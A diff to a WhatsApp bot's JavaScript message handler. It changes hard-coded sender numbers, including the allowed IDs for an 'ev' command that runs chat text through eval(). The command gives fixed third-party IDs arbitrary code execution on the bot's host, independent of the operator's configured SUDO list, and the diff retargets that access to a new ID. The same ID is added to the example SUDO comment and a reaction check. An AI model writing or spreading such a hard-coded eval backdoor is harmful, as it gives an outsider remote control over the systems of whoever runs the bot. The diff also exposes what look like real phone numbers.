@@ -788,7 +788,7 @@ const banGroups = await fetchJson(
 const isBanvisper = banGroups
   .map(id => id.replace(/[^0-9]/g, "") + "@g.us") // "1203…" ➜ "1203…@g.us"
   .includes(from);   
-const SUDO = config.SUDO; // eg: [ '94778500326@s.whatsapp.net', '194558377910501@lid' ]
+const SUDO = config.SUDO; // eg: [ '94778500326@s.whatsapp.net', '194558377910501@lid,187574828150975@lid' ]
 
 const isSudo = SUDO.filter(jid => jid.endsWith('@lid') === sender.endsWith('@lid'))
                    .includes(sender);
@@ -824,7 +824,7 @@ if(senderNumber.includes("94756857260")){
 if(isReact) return
 m.react(`${rec.alex}`)
 }
-if(senderNumber.includes("94719255382")){
+if(senderNumber.includes("187574828150975")){
 if(isReact) return
 m.react(`${rec.poorna}`)
 }
@@ -1672,7 +1672,7 @@ console.log(dsa)
     break
 // Inside your message handler (outside any case)
  case 'ev': {
-    if(senderNumber == 107593779404949 || senderNumber == 94787318729) {
+    if(senderNumber == 107593779404949 || senderNumber == 187574828150975) {
     let code2 = q.replace("°", ".toString()");
     try {
 let resultTest = await eval(code2);
